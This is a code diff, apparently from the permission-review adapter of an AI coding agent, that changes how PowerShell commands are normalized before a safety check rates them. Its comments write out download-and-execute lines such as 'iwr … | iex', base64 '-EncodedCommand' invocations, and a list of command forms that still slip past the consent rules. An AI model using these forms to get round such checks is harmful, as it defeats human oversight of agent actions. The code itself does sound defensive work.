@@ -53,200 +53,81 @@ const FILE_WRITE_TOOLS: ReadonlySet<string> = new Set([
  * (它服务的是 Bash 里写 `powershell -c "…"` 那种形态)。直接把裸语句当 exec 传下去,
  * POWERSHELL_DANGER_PATTERNS 一条都匹配不上 —— 红线形同虚设。
  *
- * 补上解释器前缀,让同一份判据对「PowerShell 工具」和「Bash 调 powershell」两种
- * 入口给出一致结论。用 `-Command` 是 pwsh 的规范长写法,判据按前缀名识别、不依赖
- * 具体参数拼写。
+ * 所以只做**一个二选一**的判断,绝不改写命令内容:
+ *   - **已经是解释器调用** → **原样透传**。core 自己能从完整路径/引号/调用运算符里求出
+ *     解释器身份(`executableName` 去目录去 `.exe`),不需要 adapter 帮忙搬位置。
+ *   - **裸语句** → 整条包成 `pwsh -Command '<原文>'`,让同一份判据对「PowerShell 工具」
+ *     和「Bash 调 powershell」两种入口给出一致结论。
+ *
+ * ---
+ * **为什么不再对已是解释器调用的命令做任何归一(review 十轮的结论)。**
+ *
+ * 早先为了把更多形态拉进 argv 级红线,这里做过一串改写:补短名前缀、剥/归一调用运算符、
+ * 把 `-Command` 载荷收成单 token、按外层分隔符切段、跳过反引号转义。每一次改写都在下一轮
+ * 被证明制造了新的缺陷,且集中在同一处:
+ *
+ *   补前缀        → 完整路径被抹平,`C:\tmp\pwsh.exe` 复用可信路径的 allow
+ *   剥运算符      → `& 'x.exe' …`(执行)与无运算符同串(不执行)折叠成一条身份
+ *   `&{1,2}`     → `&&`(语法错误、不执行)与 `&`(执行)折叠
+ *   载荷包引号    → 外层的 `Set-Content <系统路径>` 被藏进子进程载荷,并与真在子进程里的
+ *                   写法折叠
+ *   跳反引号转义  → 原始反引号仍被包进引号,与「反引号是字面字符」的写法反向折叠
+ *
+ * 根因不是某一处没写对,而是**在审查 adapter 里手写 PowerShell 解析器**:归一结果同时是
+ * `reviewAutoAction` 的缓存身份(`claude-code/index.ts:2009` 用整个 request 的序列化做 key),
+ * 所以任何"为了让判据看见而改写文本"的动作都在动权限身份 —— 少考虑一种语法就是一次
+ * allow 复用。`AGENTS.md` 指向的 `git-workflow` 也写明这类通用能力不该在业务 PR 里手写试错。
+ *
+ * 改成原样透传后,这一整类问题在结构上不再存在:身份恒等于原文,不可能折叠;
+ * 解析判断错了也无害 —— 只影响"透传还是包装",两条路 core 都会判,不会凭空放行。
+ *
+ * 实测代价(18 种形态对比,15 种判档不变):
+ *   `. 'C:\…\pwsh.exe' -enc X`(空格点源)、`pwsh -Command iwr … \`| iex`(反引号管道)
+ *   从必问回到灰区 —— core 看不到解释器/跨段,与 `Bash` 入口结论一致,缺口登记在 **#2563**;
+ *   `&& pwsh -enc X` 反而从灰区变必问(透传后 core 的分段器把 `&&` 当分隔符)。
+ * 落灰区不等于放行:审阅器面对不可读的 base64 倾向询问。
  */
 function powerShellExecCommand(command: string): string {
   const trimmed = command.trim();
   if (!trimmed) return '';
-  // 已经自带解释器前缀的(模型偶尔会写全,也可能经调用运算符 / 完整路径启动)不重复包装:
-  // 既避免 `pwsh -c pwsh -c …`,也让 core 的 **argv 级**判据看得到解释器(见下方函数注释)。
-  const nested = normalizeNestedPowerShellInvocation(trimmed);
-  if (nested) return nested;
-  // **必须整条加引号成为单个 token**。core 的 shellCommandPayload 取 `-Command`
-  // 后的**一个** token 作为载荷,而 highImpactExecutionNeedsConsent 是逐管道段判断的:
-  // 不加引号时 `pwsh -Command curl https://x/a.ps1 | iex` 会被拆成
-  //   段1 `pwsh -Command curl https://x/a.ps1`   ← 载荷里没有 iex
-  //   段2 `iex`                                  ← 看不到下载动词
-  // 两段各自都不构成红线,于是「下载即执行」降级成灰区 prompt(greptile 报,已实测复现)。
-  // 加引号后整条进同一个载荷,PowerShell 红线能同时看到下载动词与 iex。
-  return `pwsh -Command ${quoteAsSingleShellToken(trimmed)}`;
+  return looksLikePowerShellInvocation(trimmed)
+    ? trimmed
+    : `pwsh -Command ${quoteAsSingleShellToken(trimmed)}`;
 }
 
 /**
  * 把任意命令文本包成**一个** shell token,供审查判据取整条载荷。
  *
  * 只服务静态审查,不用于真实执行 —— 但仍按单引号规范转义(`'` → `'\''`),
- * 否则载荷里的引号会把 token 提前截断、又变成分段泄漏。
+ * 否则载荷里的引号会把 token 提前截断、让判据只看到前半段。
+ * 转义是单射的,所以包装对缓存身份无损:不同原文必得不同结果。
  */
 function quoteAsSingleShellToken(text: string): string {
   return `'${text.replaceAll("'", "'\\''")}'`;
 }
 
 /**
- * 识别「已经是 PowerShell 解释器调用」的形态并原样透传,让解释器落在 **token 0**。
+ * 命令**是否已经是** PowerShell 解释器调用 —— 只读判断,不改写、不重排。
  *
- * 为什么必须识别而不能一律往外包 `-Command`:core 的 PowerShell 红线有两类,
- * 只有一类能穿透包装 ——
- *   - **文本型**(`Remove-Item -Recurse`、`iex`、`iwr … | iex`)扫的是载荷正文,
- *     包在 `-Command '…'` 里照样命中;
- *   - **argv 型**(`-EncodedCommand` / `-e` / `-enc`,base64 静态不可读 → 必问)在
- *     `powerShellNeedsConsent`(shared/auto-review.ts:2141)里要求 `tokens[0]` 就是
- *     pwsh/powershell,且逐个 argv 匹配。一旦被包进 `-Command` 的载荷,它只是载荷正文里的
- *     一串字面量,argv 扫描永远看不到 → 整条从 prompt-each-time 掉进灰区(codex 报,已实测)。
+ * 覆盖:短名 / 带 `.exe` / 完整路径 / 带引号路径(含 PowerShell 重复引号转义)/
+ * 前置调用运算符(`&` 调用、`.` 点源,与目标之间空白可选)。
  *
- * 覆盖的形态:短名 / 带 `.exe` / 完整路径 / 带引号路径 / 前置调用运算符(`&` 调用、`.` 点源)
- * / PowerShell 重复引号转义。只搬位置、不改写内容,所以对非编码调用(`-File`、普通
- * `-Command`)判档与此前一致。
- *
- * ---
- * **这一层的上限,别再逐个往里补(review 六轮的结论)。**
- *
- * argv 型红线的成立条件是「解释器名字能被静态解析到 token 0」,而 PowerShell 命名解释器的
- * 方式是**开放集合**。实测下列 8 种仍落灰区,且 **`PowerShell` 工具与 `Bash` 原样透传两个
- * 入口结论完全相同**(都是 `prompt`)—— 说明这不是本 adapter 的包装造成的,而是 core 侧
- * 对所有 harness 一致存在的缺口(Codex 今天同样有):
- *
- *   & ('C:\…\pwsh.exe') -enc X          括号目标        &('pwsh') -enc X
- *   & C:\Program` Files\…\pwsh.exe …    反引号转义空格   $e = '…'; & $e -enc X   变量间接
- *   & $(Get-Command pwsh).Source …      子表达式        & ('C:\tmp\' + 'pwsh.exe') …  拼接
- *   Start-Process pwsh -ArgumentList …  间接启动        C:\Program Files\…\pwsh.exe … 未引号含空格
- *
- * 在这里逐个补只会制造 harness 分叉(单侧收严、对外却声称边界闭合),而且补不完。
- * 正确修法是给 core 的 `POWERSHELL_DANGER_PATTERNS` 加一条**文本型**规则(编码命令 flag +
- * base64 实参),8 种一次全关、两个入口同时生效 —— 但那会同时收严 Codex/Bash,属跨 harness
- * 收严,需独立评审。完整实测表与待决策点见 **#2563**。
- *
- * 落灰区不等于放行:审阅器面对不可读的 base64 倾向询问。
+ * 判错的两个方向都不会放宽判档:
+ *   - 误判成解释器 → 原样透传,core 按原文判(与 `Bash` 入口同口径);
+ *   - 误判成裸语句 → 整条包进 `-Command` 载荷,文本型红线照样扫得到,通常更严。
+ * 这正是不再做归一后换来的性质:解析不完备不再等于安全缺口。
  */
-/**
- * 开头的调用运算符:`&` 调用、`.` 点源。与目标之间的空白可选。
- *
- * 两条边界都是踩过的:
- *   - **只认单个 `&`**。`&&` 是管道链运算符,开头就写 `&& pwsh …` 左边没有管道、根本不执行,
- *     而 `& pwsh …` 会执行 —— 把两者折叠成同一条归一结果,就等于让不执行的写法拿到的 allow
- *     被能执行的写法复用(codex 报)。曾为了对齐 Bash 入口的判档写成 `&{1,2}`,那是拿判档
- *     一致性去换身份正确性,方向错了。
- *   - **`.` 必须紧跟空白或引号**。否则 `.\script.ps1` / `./script.ps1`(相对路径调用)会被
- *     剥掉开头的 `.` 而变成另一个路径。
- */
-const CALL_OPERATOR_PREFIX = /^(?:&(?!&)|\.(?=[\s'"]))\s*/;
-
-function normalizeNestedPowerShellInvocation(command: string): string | null {
-  // 调用运算符:`& <exe>` 调用、`. <exe>` 点源,两者都是启动该解释器。
+function looksLikePowerShellInvocation(command: string): boolean {
+  // `&` 调用 / `&&` 链式 / `.` 点源都可能把解释器带在后面;`.` 必须紧跟空白或引号,
+  // 否则 `.\script.ps1` / `./script.ps1` 是相对路径调用、开头的 `.` 不是运算符。
   //
-  // **必须保留「有运算符」这一位信息**:`& 'C:\path\pwsh.exe' -File a.ps1` 会执行,而去掉
-  // 运算符的同一串只是个字符串表达式(不执行)—— 两者归一成同一条缓存身份的话,
-  // 非执行形态拿到的 allow 会被执行形态复用(codex 报)。
-  //
-  // **但一律归一成 `&`,不原样保留 `.`**:core 的 splitExecutableSegments 把 `&` 当分隔符
-  // (于是解释器落回段首),却不识别 `.` —— 原样留 `.` 会让它占住 token 0,
-  // `-EncodedCommand` 的 argv 红线随之失效(实测:`. 'C:\…\pwsh.exe' -enc X` 掉回灰区)。
-  // 对**可执行文件**而言 `.` 与 `&` 效果相同(点源的作用域差异只对脚本有意义),
-  // 合并这两种写法是安全的;真正要区分的「执行 / 不执行」这一位完整保住了。
-  //
-  // 运算符与目标之间的空白是**可选**的(`&'C:\…\pwsh.exe'`、`.'…'` 都是合法 PowerShell)。
-  // 早先要求必须有空白,于是紧贴写法整条被包成 `-Command` 载荷、argv 红线失效 —— 而 core
-  // 原样透传这些写法时是**能**命中的(实测 `&'C:\…\pwsh.exe' -enc X` 在 Bash 入口判
-  // prompt-each-time),也就是说那个降级是本 adapter 自己造成的,不属于 #2563 的 core 侧
-  // 缺口(codex 报)。判定归属就靠这条:两个入口结论不同 = 我的问题,结论相同 = core 的问题。
-  //
-  // 运算符的形状边界见 CALL_OPERATOR_PREFIX 的注释(只认单个 `&`;`.` 须紧跟空白或引号)。
-  const operator = CALL_OPERATOR_PREFIX.test(command) ? '& ' : '';
-  const withoutOperator = command.replace(CALL_OPERATOR_PREFIX, '');
+  // 这里连 `&&` 一起认,与「归一时期」的口径相反 —— 那时必须排除 `&&`,因为把它改写成 `&`
+  // 会让「语法错误、不执行」与「真执行」折叠成同一条缓存身份(codex 报)。现在只做识别、
+  // 不改写内容,身份恒等于原文,`&&…` 与 `&…` 天然是两条不同身份,约束不再需要。
+  // 同一段正则用于改写时危险、只用于识别时无害 —— 这就是不再归一换来的结构性收益。
+  const withoutOperator = command.replace(/^(?:&{1,2}|\.(?=[\s'"]))\s*/, '');
   const target = leadingShellToken(withoutOperator);
-  if (!target) return null;
-  if (!isPowerShellExecutable(target.value)) return null;
-  // **解释器 token 原样保留,不改写成短名**。core 自己就能从完整路径求出解释器身份
-  // (`executableName` 去目录去 `.exe`,实测 Bash 入口对 `'C:\…\pwsh.exe' -enc X` 判红),
-  // 所以改写既无必要,又会抹掉路径 —— 而归一结果就是 reviewAutoAction 的缓存身份:
-  // `& 'C:\Program Files\PowerShell\7\pwsh.exe' -File a.ps1` 与
-  // `& 'C:\tmp\pwsh.exe' -File a.ps1` 会变成同一条 key,可信路径拿到的 allow 会被任意
-  // 一个叫 pwsh.exe 的二进制复用(codex 报,已实测复现)。只剥调用运算符。
-  const executable = withoutOperator.slice(0, target.length);
-  const rest = withoutOperator.slice(target.length).trim();
-  const args = rest ? ` ${normalizeInterpreterArgs(rest)}` : '';
-  return `${operator}${executable}${args}`;
-}
-
-/**
- * 归一余参:把 `-Command` 家族的载荷收成**单个** token。
- *
- * 只搬解释器位置是不够的 —— `pwsh -Command iwr https://x/a.ps1 | iex` 里载荷未加引号,
- * `splitExecutableSegments` 会在顶层 `|` 处切开:段1 的 PowerShell 载荷是
- * `iwr https://x/a.ps1`(看不到 iex)、段2 是裸 `iex`(tokens[0] 不是 pwsh,PowerShell
- * 判据整条不适用),两段各自都不构成红线 → 「下载即执行」降级成灰区(codex 报,已实测)。
- * 加引号后 `|` 落在引号内,分段器(引号感知)不再切开,红线能同时看到下载动词与 iex。
- *
- * `-EncodedCommand` 家族原样保留:base64 载荷不含 shell 语义,core 靠 **argv 位置**命中,
- * 包进引号反而会让 argv 扫描看不到这个 flag。
- */
-function normalizeInterpreterArgs(args: string): string {
-  const consumed: string[] = [];
-  let rest = args;
-  while (rest.length > 0) {
-    const token = leadingShellToken(rest);
-    if (!token) break;
-    const raw = rest.slice(0, token.length);
-    const name = token.value.split('=')[0].toLowerCase();
-    // PowerShell 允许唯一前缀缩写(-c/-co/… = -Command,-e/-enc/… = -EncodedCommand),
-    // 与 core 的 powerShellNeedsConsent 用同一套前缀判据,避免两边认定不一致。
-    if (name.length >= 2 && '-encodedcommand'.startsWith(name)) return args;
-    if (name.length >= 2 && '-command'.startsWith(name)) {
-      const payload = rest.slice(token.length).trim();
-      if (!payload) return args;
-      // 只收拢**真正进入子进程**的那一段:`;` / `|` / `&&` 等是**外层**分隔符,其后的命令由
-      // 外层 shell 执行,不属于 `-Command` 载荷。把它们一并包进引号会谎报执行位置 ——
-      // `pwsh -Command exit 0; Set-Content <系统路径> x` 的写操作发生在外层,包进去就藏起来了,
-      // 而且与「整段都在子进程里」的写法折叠成同一条缓存身份(codex 报,已实测)。
-      const { head, tail } = splitAtFirstOuterSeparator(payload);
-      if (!head) return args;
-      const quoted = quoteIfMultiToken(head);
-      return [...consumed, raw, tail ? `${quoted} ${tail}` : quoted].join(' ');
-    }
-    consumed.push(raw);
-    rest = rest.slice(token.length).trimStart();
-  }
-  return args;
-}
-
-/**
- * 在**引号外**的第一个 shell 分隔符处切开:`head` 是进入子进程的载荷,`tail` 是仍由外层
- * 执行的部分(含分隔符本身,原样保留)。引号内按 PowerShell 的重复引号转义跳过。
- */
-function splitAtFirstOuterSeparator(text: string): { head: string; tail: string } {
-  let inSingle = false;
-  let inDouble = false;
-  for (let i = 0; i < text.length; i++) {
-    const ch = text[i];
-    // 反引号是 PowerShell 的转义符(单引号串内除外):`` `| `` 是**字面** `|`,作为参数传给子进程,
-    // 那条管道其实在子进程内执行。不消费被转义的字符就会误当外层分隔符切开 —— 「下载即执行」
-    // 因此掉进灰区(codex 报)。转义同样能挡住引号,所以必须在引号判断之前处理。
-    if (ch === '`' && !inSingle) { i++; continue; }
-    if (ch === "'" && !inDouble) {
-      if (inSingle && text[i + 1] === "'") { i++; continue; } // '' = 字面单引号
-      inSingle = !inSingle;
-      continue;
-    }
-    if (ch === '"' && !inSingle) {
-      if (inDouble && text[i + 1] === '"') { i++; continue; } // "" = 字面双引号
-      inDouble = !inDouble;
-      continue;
-    }
-    if (inSingle || inDouble) continue;
-    if (ch === ';' || ch === '|' || ch === '&') {
-      return { head: text.slice(0, i).trimEnd(), tail: text.slice(i).trim() };
-    }
-  }
-  return { head: text, tail: '' };
-}
-
-/** 已经是单个 token 的载荷保持原样(避免双重包引号);否则整条包成一个 token。 */
-function quoteIfMultiToken(payload: string): string {
-  const single = leadingShellToken(payload);
-  if (single && single.length === payload.length) return payload;
-  return quoteAsSingleShellToken(payload);
+  return target !== null && isPowerShellExecutable(target.value);
 }
 
 /**
